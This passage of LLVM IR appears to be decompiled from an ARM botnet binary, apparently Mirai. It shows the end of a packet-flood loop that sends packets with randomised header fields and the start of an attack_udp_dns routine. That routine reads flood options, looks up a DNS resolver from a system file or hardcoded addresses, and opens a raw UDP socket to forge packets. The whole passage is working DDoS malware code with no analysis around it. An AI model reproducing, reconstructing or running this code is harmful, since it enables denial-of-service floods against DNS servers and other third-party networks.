  %v3_b794 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b794, i32* %r3.global-to-local, align 4
  %v3_b798 = mul i32 %v3_b794, 32
  store i32 %v3_b798, i32* %lr.global-to-local, align 4
  %v3_b79c = load i32, i32* @r6, align 4
  %v4_b79c = add i32 %v3_b79c, 6
  %v5_b79c = inttoptr i32 %v4_b79c to i16*
  store i16 %v5_b790, i16* %v5_b79c, align 2
  %v0_b7a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_b7a0 = load i32, i32* %r3.global-to-local, align 4
  %tmp44 = mul i32 %v1_b7a0, -8
  %v5_b7a0 = add i32 %v0_b7a0, %tmp44
  store i32 %v5_b7a0, i32* %lr.global-to-local, align 4
  %v0_b7a4 = load i32, i32* @r6, align 4
  %v1_b7a4 = add i32 %v0_b7a4, 2
  %v2_b7a4 = inttoptr i32 %v1_b7a4 to i16*
  %v3_b7a4 = load i16, i16* %v2_b7a4, align 2
  %v4_b7a4 = zext i16 %v3_b7a4 to i32
  store i32 %v4_b7a4, i32* @r6, align 4
  %v3_b7a8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_b7a8, i32* %r2.global-to-local, align 4
  %v1_b7ac = load i32, i32* @r8, align 4
  %v2_b7ac = add i32 %v1_b7ac, %v5_b7a0
  store i32 %v2_b7ac, i32* @lr, align 4
  %v3_b7b0 = add i32 %v2_b7ac, 2
  %v4_b7b0 = inttoptr i32 %v3_b7b0 to i16*
  store i16 %v3_b7a4, i16* %v4_b7b0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b7bc = load i32, i32* @r5, align 4
  %v0_b7c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b7c0 = add i32 %v0_b7c0, 32
  store i32 %v1_b7c0, i32* %r2.global-to-local, align 4
  %v0_b7c4 = load i32, i32* @sl, align 4
  %v0_b7c8 = load i32, i32* @lr, align 4
  %v6_b7d0 = call i32 @__libc_sendto(i32 %v0_b7c4, i32 %v0_b7bc, i32 %v1_b7c0, i32 16384, i32 %v0_b7c8, i32 16)
  %v3_b7d4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b7d4, i32* %r3.global-to-local, align 4
  %v1_b7d8 = add i32 %v3_b7d4, 1
  %v1_b7dc = load i32, i32* @fp, align 4
  store i32 %v1_b7d8, i32* %stack_var_-44, align 4
  %v6_b7e4 = icmp slt i32 %v1_b7d8, %v1_b7dc
  br i1 %v6_b7e4, label %dec_label_pc_b7e8, label %dec_label_pc_b8a4

dec_label_pc_b7e8:                                ; preds = %dec_label_pc_b760, %dec_label_pc_b734
  %v1_b7f8 = phi i32 [ %v1_b7d8, %dec_label_pc_b760 ], [ 0, %dec_label_pc_b734 ]
  %v5_b7ec = mul i32 %v1_b7f8, 24
  %v1_b7f0 = load i32, i32* @r8, align 4
  %v2_b7f0 = add i32 %v1_b7f0, %v5_b7ec
  store i32 %v2_b7f0, i32* %r3.global-to-local, align 4
  %v1_b7f4 = add i32 %v2_b7f0, 20
  %v2_b7f4 = inttoptr i32 %v1_b7f4 to i8*
  %v3_b7f4 = load i8, i8* %v2_b7f4, align 1
  %v4_b7f4 = zext i8 %v3_b7f4 to i32
  store i32 %v4_b7f4, i32* %r2.global-to-local, align 4
  %v0_b7f8 = load i32, i32* @sb, align 4
  %v4_b7f8 = mul i32 %v1_b7f8, 4
  %v5_b7f8 = add i32 %v0_b7f8, %v4_b7f8
  %v6_b7f8 = inttoptr i32 %v5_b7f8 to i32*
  %v7_b7f8 = load i32, i32* %v6_b7f8, align 4
  store i32 %v7_b7f8, i32* @r5, align 4
  store i32 65535, i32* @r7, align 4
  %v1_b808 = add i32 %v7_b7f8, 20
  store i32 %v1_b808, i32* @r6, align 4
  %tmp45 = icmp ugt i8 %v3_b7f4, 31
  br i1 %tmp45, label %dec_label_pc_b73c, label %dec_label_pc_b810

dec_label_pc_b810:                                ; preds = %dec_label_pc_b7e8
  %v1_b810 = add i32 %v2_b7f0, 16
  %v2_b810 = inttoptr i32 %v1_b810 to i32*
  %v3_b810 = load i32, i32* %v2_b810, align 4
  store i32 %v3_b810, i32* %r4.global-to-local, align 4
  %v0_b814 = call i32 @rand_next()
  %v3_b818 = load i32, i32* %stack_var_-44, align 4
  %v5_b820 = mul i32 %v3_b818, 24
  %v1_b824 = and i32 %v3_b810, 16711680
  store i32 %v1_b824, i32* %ip.global-to-local, align 4
  %v3_b828 = udiv i32 %v3_b810, 16777216
  %v4_b82c = udiv i32 %v1_b824, 256
  %v5_b82c = or i32 %v4_b82c, %v3_b828
  store i32 %v5_b82c, i32* %r2.global-to-local, align 4
  %v1_b830 = load i32, i32* @r8, align 4
  %v2_b830 = add i32 %v1_b830, %v5_b820
  %v1_b834 = and i32 %v3_b810, 65280
  store i32 %v1_b834, i32* %r3.global-to-local, align 4
  %v1_b838 = add i32 %v2_b830, 20
  %v2_b838 = inttoptr i32 %v1_b838 to i8*
  %v3_b838 = load i8, i8* %v2_b838, align 1
  %v4_b838 = zext i8 %v3_b838 to i32
  store i32 %v4_b838, i32* %ip.global-to-local, align 4
  %v5_b840 = call i32 @llvm.bswap.i32(i32 %v3_b810)
  %v7_b844 = lshr i32 %v0_b814, %v4_b838
  %v8_b844 = add i32 %v7_b844, %v5_b840
  store i32 %v8_b844, i32* %r2.global-to-local, align 4
  %v5_b860 = call i32 @llvm.bswap.i32(i32 %v8_b844)
  store i32 %v5_b860, i32* %r3.global-to-local, align 4
  %v1_b864 = load i32, i32* @r7, align 4
  %v9_b864 = icmp eq i32 %v3_b5d4, %v1_b864
  %v1_b868 = load i32, i32* @r5, align 4
  %v2_b868 = add i32 %v1_b868, 16
  %v3_b868 = inttoptr i32 %v2_b868 to i32*
  store i32 %v5_b860, i32* %v3_b868, align 4
  br i1 %v9_b864, label %dec_label_pc_b870, label %dec_label_pc_b810.dec_label_pc_b748_crit_edge

dec_label_pc_b810.dec_label_pc_b748_crit_edge:    ; preds = %dec_label_pc_b810
  %v1_b74c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b748

dec_label_pc_b870:                                ; preds = %dec_label_pc_b810, %dec_label_pc_b73c
  %v0_b870 = call i32 @rand_next()
  %v1_b870 = trunc i32 %v0_b870 to i16
  store i32 %v3_b5d8, i32* %r2.global-to-local, align 4
  %v1_b878 = load i32, i32* @r7, align 4
  %v9_b878 = icmp eq i32 %v3_b5d8, %v1_b878
  %v3_b87c = load i32, i32* @r5, align 4
  %v4_b87c = add i32 %v3_b87c, 4
  %v5_b87c = inttoptr i32 %v4_b87c to i16*
  store i16 %v1_b870, i16* %v5_b87c, align 2
  br i1 %v9_b878, label %dec_label_pc_b884, label %dec_label_pc_b870.dec_label_pc_b754_crit_edge

dec_label_pc_b870.dec_label_pc_b754_crit_edge:    ; preds = %dec_label_pc_b870
  %v1_b758.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b754

dec_label_pc_b884:                                ; preds = %dec_label_pc_b870, %dec_label_pc_b748
  %v0_b884 = call i32 @rand_next()
  %v1_b884 = trunc i32 %v0_b884 to i16
  store i32 %v3_b5dc, i32* %r3.global-to-local, align 4
  %v1_b88c = load i32, i32* @r7, align 4
  %v9_b88c = icmp eq i32 %v3_b5dc, %v1_b88c
  %v3_b890 = load i32, i32* @r5, align 4
  %v4_b890 = add i32 %v3_b890, 20
  %v5_b890 = inttoptr i32 %v4_b890 to i16*
  store i16 %v1_b884, i16* %v5_b890, align 2
  br i1 %v9_b88c, label %dec_label_pc_b898, label %dec_label_pc_b760

dec_label_pc_b898:                                ; preds = %dec_label_pc_b884, %dec_label_pc_b754
  %v0_b898 = call i32 @rand_next()
  %v1_b898 = trunc i32 %v0_b898 to i16
  %v3_b89c = load i32, i32* @r6, align 4
  %v4_b89c = add i32 %v3_b89c, 2
  %v5_b89c = inttoptr i32 %v4_b89c to i16*
  store i16 %v1_b898, i16* %v5_b89c, align 2
  br label %dec_label_pc_b760

dec_label_pc_b8a4:                                ; preds = %dec_label_pc_b760, %dec_label_pc_b724
  %v2_b8a8 = call i32 @__GI_time(i32* null)
  store i32 %v2_b55c, i32* %ip.global-to-local, align 4
  %v6_b8b4 = icmp slt i32 %v2_b55c, %v2_b8a8
  br i1 %v6_b8b4, label %dec_label_pc_b8b8, label %dec_label_pc_b8a4.dec_label_pc_b724_crit_edge

dec_label_pc_b8a4.dec_label_pc_b724_crit_edge:    ; preds = %dec_label_pc_b8a4
  %v0_b728.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_b724

dec_label_pc_b8b8:                                ; preds = %dec_label_pc_b8a4, %entry, %dec_label_pc_b8c4
  %v1_b8c0 = phi i32 [ %v3_b588, %entry ], [ %v1_b8c8, %dec_label_pc_b8c4 ], [ %v2_b8a8, %dec_label_pc_b8a4 ]
  store i32 %v3_b468, i32* %r4.global-to-local, align 4
  store i32 %v27_b468, i32* %lr.global-to-local, align 4
  ret i32 %v1_b8c0

dec_label_pc_b8c4:                                ; preds = %dec_label_pc_b598
  %v0_b8c4 = load i32, i32* @sl, align 4
  %v1_b8c8 = call i32 @__GI___libc_close(i32 %v0_b8c4)
  br label %dec_label_pc_b8b8

; uselistorder directives
  uselistorder i32 %v5_b860, { 1, 0 }
  uselistorder i32 %v3_b810, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_b7d8, { 1, 2, 0 }
  uselistorder i32 %v5_b7a0, { 1, 0 }
  uselistorder i32 %v0_b77c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_b714, { 1, 0, 2 }
  uselistorder i32 %v3_b678, { 1, 0 }
  uselistorder i32 %v0_b63c, { 1, 2, 0 }
  uselistorder i32 %v3_b614, { 1, 0 }
  uselistorder i32 %v3_b5d4, { 0, 2, 1 }
  uselistorder i32 %v0_b5cc, { 1, 0, 2 }
  uselistorder i32 %v3_b588, { 1, 2, 3, 0 }
  uselistorder i32 %v2_b55c, { 1, 0 }
  uselistorder i32 %v6_b52c, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v1_b514, { 1, 2, 0 }
  uselistorder i32 %v5_b508, { 1, 0 }
  uselistorder i32 %v7_b4d0, { 1, 0, 2, 3 }
  uselistorder i32 %v6_b4ac, { 1, 2, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 12, 4, 5, 6, 7, 8, 9, 10, 11, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder label %dec_label_pc_b8b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b760, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b724, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_b8d4 = load i32, i32* @sb, align 4
  %v27_b8d4 = load i32, i32* @lr, align 4
  store i32 0, i32* @sl, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_b904 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_b908 = load i32, i32* @r4, align 4
  store i32 %v0_b908, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_b914 = load i32, i32* @sl, align 4
  store i32 %v0_b914, i32* %r3.global-to-local, align 4
  %v0_b918 = load i32, i32* @r5, align 4
  store i32 %v0_b918, i32* %r0.global-to-local, align 4
  %v5_b91c = inttoptr i32 %v0_b908 to i32*
  %v6_b91c = call i32 @attack_get_opt_int(i32 %v0_b918, i32* %v5_b91c, i32 2, i32 %v0_b914, i32 %v2_b904)
  %v1_b928 = urem i32 %v6_b91c, 256
  store i32 %v1_b928, i32* %ip.global-to-local, align 4
  %v0_b92c = load i32, i32* @r4, align 4
  store i32 %v0_b92c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b938 = load i32, i32* @r5, align 4
  store i32 %v0_b938, i32* %r0.global-to-local, align 4
  %v6_b940 = inttoptr i32 %v0_b92c to i32*
  %v7_b940 = call i32 @attack_get_opt_int(i32 %v0_b938, i32* %v6_b940, i32 3, i32 65535, i32 %v1_b928)
  %v0_b944 = load i32, i32* @r4, align 4
  store i32 %v0_b944, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_b954 = load i32, i32* @r5, align 4
  store i32 %v0_b954, i32* %r0.global-to-local, align 4
  %v5_b958 = inttoptr i32 %v0_b944 to i32*
  %v6_b958 = call i32 @attack_get_opt_int(i32 %v0_b954, i32* %v5_b958, i32 4, i32 64, i32 %v7_b940)
  %v0_b960 = load i32, i32* @r4, align 4
  store i32 %v0_b960, i32* %r1.global-to-local, align 4
  %v1_b964 = urem i32 %v6_b958, 256
  store i32 %v1_b964, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_b96c = load i32, i32* @sl, align 4
  store i32 %v0_b96c, i32* %r3.global-to-local, align 4
  %v0_b970 = load i32, i32* @r5, align 4
  store i32 %v0_b970, i32* %r0.global-to-local, align 4
  %sext21 = mul i32 %v6_b958, 16777216
  %v5_b978 = sdiv i32 %sext21, 16777216
  %v6_b978 = inttoptr i32 %v0_b960 to i32*
  %v7_b978 = call i32 @attack_get_opt_int(i32 %v0_b970, i32* %v6_b978, i32 5, i32 %v0_b96c, i32 %v5_b978)
  %v1_b984 = urem i32 %v7_b978, 256
  store i32 %v1_b984, i32* %ip.global-to-local, align 4
  %v0_b988 = load i32, i32* @r4, align 4
  store i32 %v0_b988, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b994 = load i32, i32* @r5, align 4
  store i32 %v0_b994, i32* %r0.global-to-local, align 4
  %v5_b99c = inttoptr i32 %v0_b988 to i32*
  %v6_b99c = call i32 @attack_get_opt_int(i32 %v0_b994, i32* %v5_b99c, i32 6, i32 65535, i32 %v1_b984)
  %v0_b9a0 = load i32, i32* @r4, align 4
  store i32 %v0_b9a0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v0_b9b0 = load i32, i32* @r5, align 4
  store i32 %v0_b9b0, i32* %r0.global-to-local, align 4
  %v5_b9b4 = inttoptr i32 %v0_b9a0 to i32*
  %v6_b9b4 = call i32 @attack_get_opt_int(i32 %v0_b9b0, i32* %v5_b9b4, i32 7, i32 53, i32 %v6_b99c)
  %v0_b9bc = load i32, i32* @r4, align 4
  store i32 %v0_b9bc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v0_b9cc = load i32, i32* @r5, align 4
  store i32 %v0_b9cc, i32* %r0.global-to-local, align 4
  %v5_b9d0 = inttoptr i32 %v0_b9bc to i32*
  %v6_b9d0 = call i32 @attack_get_opt_int(i32 %v0_b9cc, i32* %v5_b9d0, i32 9, i32 65535, i32 %v6_b9b4)
  %v0_b9d4 = load i32, i32* @r4, align 4
  store i32 %v0_b9d4, i32* %r1.global-to-local, align 4
  %v0_b9dc = load i32, i32* @sl, align 4
  store i32 %v0_b9dc, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_b9e4 = load i32, i32* @r5, align 4
  store i32 %v0_b9e4, i32* %r0.global-to-local, align 4
  %v5_b9e8 = inttoptr i32 %v0_b9d4 to i32*
  %v6_b9e8 = call i32 @attack_get_opt_int(i32 %v0_b9e4, i32* %v5_b9e8, i32 %v0_b9dc, i32 12, i32 %v6_b9d0)
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_b9f0 = load i32, i32* @sl, align 4
  store i32 %v0_b9f0, i32* %r3.global-to-local, align 4
  %v0_b9f4 = load i32, i32* @r4, align 4
  store i32 %v0_b9f4, i32* %r1.global-to-local, align 4
  %v0_b9fc = load i32, i32* @r5, align 4
  store i32 %v0_b9fc, i32* %r0.global-to-local, align 4
  %v5_ba00 = inttoptr i32 %v0_b9f4 to i32*
  %v6_ba00 = call i32 @attack_get_opt_str(i32 %v0_b9fc, i32* %v5_ba00, i32 8, i32 %v0_b9f0, i32 %v6_b9e8)
  store i32 %v6_ba00, i32* @r7, align 4
  store i32 15, i32* %r0.global-to-local, align 4
  %v1_ba0c = call i32 @table_unlock_val(i32 15)
  %v0_ba10 = load i32, i32* @sl, align 4
  store i32 %v0_ba10, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r0.global-to-local, align 4
  %v2_ba18 = inttoptr i32 %v0_ba10 to i32*
  %v3_ba18 = call i32 @table_retrieve_val(i32 15, i32* %v2_ba18)
  store i32 %v3_ba18, i32* %r0.global-to-local, align 4
  %v0_ba1c = load i32, i32* @sl, align 4
  store i32 %v0_ba1c, i32* %r1.global-to-local, align 4
  %v2_ba20 = inttoptr i32 %v0_ba1c to i64*
  %v3_ba20 = call i32 @__libc_open(i32 %v3_ba18, i64* %v2_ba20)
  store i32 %v3_ba20, i32* @r4, align 4
  store i32 15, i32* %r0.global-to-local, align 4
  %v1_ba2c = call i32 @table_lock_val(i32 15)
  store i32 %v1_ba2c, i32* %r0.global-to-local, align 4
  %v0_ba30 = load i32, i32* @r4, align 4
  %v1_ba30 = load i32, i32* @sl, align 4
  %v9_ba30 = icmp eq i32 %v0_ba30, %v1_ba30
  store i1 %v9_ba30, i1* %cpsr_z.global-to-local, align 1
  %v5_ba34 = icmp slt i32 %v0_ba30, %v1_ba30
  br i1 %v5_ba34, label %dec_label_pc_baf0, label %dec_label_pc_ba38

dec_label_pc_ba38:                                ; preds = %entry
  %v2_ba3c = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_ba3c, i32* %sb.global-to-local, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_ba3c, i32* @r1, align 4
  store i32 %v0_ba30, i32* %r0.global-to-local, align 4
  %v1_ba4c = call i32 @__libc_read(i32 %v0_ba30)
  store i32 %v1_ba4c, i32* @r6, align 4
  %v0_ba54 = load i32, i32* @r4, align 4
  store i32 %v0_ba54, i32* %r0.global-to-local, align 4
  %v1_ba58 = call i32 @__GI___libc_close(i32 %v0_ba54)
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_ba60 = call i32 @table_unlock_val(i32 16)
  %v0_ba64 = load i32, i32* @sl, align 4
  store i32 %v0_ba64, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v2_ba6c = inttoptr i32 %v0_ba64 to i32*
  %v3_ba6c = call i32 @table_retrieve_val(i32 16, i32* %v2_ba6c)
  %v0_ba70 = load i32, i32* @r6, align 4
  store i32 %v0_ba70, i32* @r1, align 4
  store i32 %v3_ba6c, i32* %r2.global-to-local, align 4
  store i32 %v2_ba3c, i32* %r0.global-to-local, align 4
  %v3_ba7c = bitcast i32* %stack_var_-2124 to i8*
  %v4_ba7c = call i32 @util_stristr(i8* %v3_ba7c, i32 %v0_ba70, i32 %v3_ba6c)
  store i32 %v4_ba7c, i32* @r8, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_ba88 = call i32 @table_lock_val(i32 16)
  store i32 %v1_ba88, i32* %r0.global-to-local, align 4
  %v0_ba8c = load i32, i32* @r8, align 4
  %v7_ba8c = icmp eq i32 %v0_ba8c, -1
  store i1 %v7_ba8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ba8c, label %dec_label_pc_baf0, label %dec_label_pc_ba94

dec_label_pc_ba94:                                ; preds = %dec_label_pc_ba38
  %v0_ba94 = load i32, i32* @r6, align 4
  %v9_ba94 = icmp eq i32 %v0_ba94, %v0_ba8c
  store i1 %v9_ba94, i1* %cpsr_z.global-to-local, align 1
  %v7_ba98 = icmp sgt i32 %v0_ba94, %v0_ba8c
  br i1 %v7_ba98, label %dec_label_pc_ba9c, label %dec_label_pc_baf0

dec_label_pc_ba9c:                                ; preds = %dec_label_pc_ba94
  %v0_ba9c = load i32, i32* @sl, align 4
  store i32 %v0_ba9c, i32* %r1.global-to-local, align 4
  %v0_baa0 = load i32, i32* %sb.global-to-local, align 4
  %v2_baa0 = add i32 %v0_baa0, %v0_ba8c
  store i32 %v2_baa0, i32* %ip.global-to-local, align 4
  %v1_bab0 = add i32 %v0_ba94, -1
  br label %dec_label_pc_baa8

dec_label_pc_baa8:                                ; preds = %dec_label_pc_bae4, %dec_label_pc_ba9c
  %v0_bae4 = phi i32 [ %v1_bae4, %dec_label_pc_bae4 ], [ %v0_ba8c, %dec_label_pc_ba9c ]
  %v0_bacc = phi i32 [ %v0_bacc27, %dec_label_pc_bae4 ], [ %v0_ba9c, %dec_label_pc_ba9c ]
  %v0_baac = phi i32 [ %v0_baac23, %dec_label_pc_bae4 ], [ %v0_ba9c, %dec_label_pc_ba9c ]
  %v0_bab4 = phi i32 [ %v1_bab4, %dec_label_pc_bae4 ], [ %v2_baa0, %dec_label_pc_ba9c ]
  %v1_baa8 = inttoptr i32 %v0_bab4 to i8*
  %v2_baa8 = load i8, i8* %v1_baa8, align 1
  %v3_baa8 = zext i8 %v2_baa8 to i32
  store i32 %v3_baa8, i32* %r0.global-to-local, align 4
  %v2_baac = icmp eq i32 %v0_baac, 0
  store i1 %v2_baac, i1* %cpsr_z.global-to-local, align 1
  %v1_bab4 = add i32 %v0_bab4, 1
  store i32 %v1_bab4, i32* %ip.global-to-local, align 4
  %v1_bab8 = add nsw i32 %v3_baa8, -48
  store i32 %v1_bab8, i32* @lr, align 4
  br i1 %v2_baac, label %dec_label_pc_bac0, label %dec_label_pc_bad0

dec_label_pc_bac0:                                ; preds = %dec_label_pc_baa8
  %v7_bac0 = icmp eq i8 %v2_baa8, 9
  store i1 %v7_bac0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bac0, label %dec_label_pc_bae4, label %bb

bb:                                               ; preds = %dec_label_pc_bac0
  %v8_bac4 = icmp eq i8 %v2_baa8, 32
  store i1 %v8_bac4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_bac4, label %dec_label_pc_bae4, label %dec_label_pc_bacc

dec_label_pc_bacc:                                ; preds = %bb
  %v1_bacc = add i32 %v0_bacc, 1
  store i32 %v1_bacc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bad0

dec_label_pc_bad0:                                ; preds = %dec_label_pc_baa8, %dec_label_pc_bacc
  %v0_bacc28 = phi i32 [ %v0_bacc, %dec_label_pc_baa8 ], [ %v1_bacc, %dec_label_pc_bacc ]
  %v0_baac24 = phi i32 [ %v0_baac, %dec_label_pc_baa8 ], [ %v1_bacc, %dec_label_pc_bacc ]
  %v7_bad0 = icmp eq i8 %v2_baa8, 46
  store i1 %v7_bad0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bad0, label %dec_label_pc_badc, label %bb113

bb113:                                            ; preds = %dec_label_pc_bad0
  %v3_bad4 = icmp ugt i32 %v1_bab8, 8
  %v8_bad4 = icmp eq i32 %v1_bab8, 9
  store i1 %v8_bad4, i1* %cpsr_z.global-to-local, align 1
  %v2_bad8 = xor i1 %v8_bad4, true
  %v3_bad8 = and i1 %v3_bad4, %v2_bad8
  br i1 %v3_bad8, label %dec_label_pc_bf44, label %dec_label_pc_badc

dec_label_pc_badc:                                ; preds = %dec_label_pc_bad0, %bb113
  %v9_badc = icmp eq i32 %v1_bab0, %v0_bae4
  store i1 %v9_badc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_badc, label %dec_label_pc_bf44, label %dec_label_pc_bae4

dec_label_pc_bae4:                                ; preds = %dec_label_pc_bac0, %dec_label_pc_badc, %bb
  %v0_bacc27 = phi i32 [ %v0_bacc, %dec_label_pc_bac0 ], [ %v0_bacc28, %dec_label_pc_badc ], [ %v0_bacc, %bb ]
  %v0_baac23 = phi i32 [ 0, %dec_label_pc_bac0 ], [ %v0_baac24, %dec_label_pc_badc ], [ 0, %bb ]
  %v1_bae4 = add i32 %v0_bae4, 1
  store i32 %v1_bae4, i32* @r4, align 4
  %v9_bae8 = icmp eq i32 %v1_bae4, %v0_ba94
  store i1 %v9_bae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bae8, label %dec_label_pc_baf0, label %dec_label_pc_baa8

dec_label_pc_baf0:                                ; preds = %dec_label_pc_bae4, %dec_label_pc_ba94, %dec_label_pc_ba38, %entry
  %v0_baf0 = call i32 @rand_next()
  %v1_baf4 = urem i32 %v0_baf0, 4
  store i32 %v1_baf4, i32* %r0.global-to-local, align 4
  %v2_baf8 = icmp eq i32 %v1_baf4, 3
  store i1 %v2_baf8, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_baf0 to i2
  switch i2 %trunc, label %dec_label_pc_bb248 [
    i2 0, label %dec_label_pc_bf90
    i2 1, label %dec_label_pc_bfa4
    i2 -2, label %dec_label_pc_bf80
    i2 -1, label %dec_label_pc_bb14
  ]

dec_label_pc_bb14:                                ; preds = %dec_label_pc_baf0
  store i32 33686020, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_bb24

dec_label_pc_bb248:                               ; preds = %dec_label_pc_baf0
  unreachable

dec_label_pc_bb24:                                ; preds = %dec_label_pc_bfa4, %dec_label_pc_bf90, %dec_label_pc_bf80, %dec_label_pc_bf44, %dec_label_pc_bb14
  %stack_var_-2184.0 = phi i32 [ 33686020, %dec_label_pc_bb14 ], [ 104859200, %dec_label_pc_bf80 ], [ 707416650, %dec_label_pc_bfa4 ], [ 134744072, %dec_label_pc_bf90 ], [ %v1_bf74, %dec_label_pc_bf44 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_bb28 = call i32 @__GI_time(i32* null)
  %v0_bb2c = load i32, i32* @r7, align 4
  %v2_bb2c = icmp eq i32 %v0_bb2c, 0
  store i1 %v2_bb2c, i1* %cpsr_z.global-to-local, align 1
  %v1_bb30 = load i32, i32* @fp, align 4
  %v2_bb30 = add i32 %v1_bb30, %v2_bb28
  store i32 %v2_bb30, i32* %r0.global-to-local, align 4
  br i1 %v2_bb2c, label %dec_label_pc_bf1c, label %dec_label_pc_bb3c

dec_label_pc_bb3c:                                ; preds = %dec_label_pc_bb24
  store i32 %v0_bb2c, i32* %r0.global-to-local, align 4
  %v1_bb40 = inttoptr i32 %v0_bb2c to i8*
  %v2_bb40 = call i32 @util_strlen(i8* %v1_bb40)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_bb54 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_bb54, i32* %r0.global-to-local, align 4
  %v7_bb58 = icmp eq i32 %v3_bb54, -1
  store i1 %v7_bb58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bb58, label %dec_label_pc_bf1c, label %dec_label_pc_bb64

dec_label_pc_bb64:                                ; preds = %dec_label_pc_bb3c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bb6c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bb6c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bb80 = call i32 @__GI_setsockopt(i32 %v3_bb54, i32 0, i32 3, i32 %v6_bb6c, i32 4)
  store i32 %v5_bb80, i32* %r0.global-to-local, align 4
  %v7_bb84 = icmp eq i32 %v5_bb80, -1
  store i1 %v7_bb84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bb84, label %dec_label_pc_bf14, label %dec_label_pc_bb8c

dec_label_pc_bb8c:                                ; preds = %dec_label_pc_bb64
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v3_bba8 = mul i32 %v6_b9b4, 65536
  store i32 %v3_bba8, i32* %sb.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_bbb8 = urem i32 %v7_b940, 65536
  %v3_bbbc = urem i32 %v6_b99c, 65536
  store i32 %v3_bbbc, i32* %r0.global-to-local, align 4
  %v3_bbc0 = urem i32 %v6_b9b4, 65536
  store i32 %v3_bbc0, i32* %r1.global-to-local, align 4
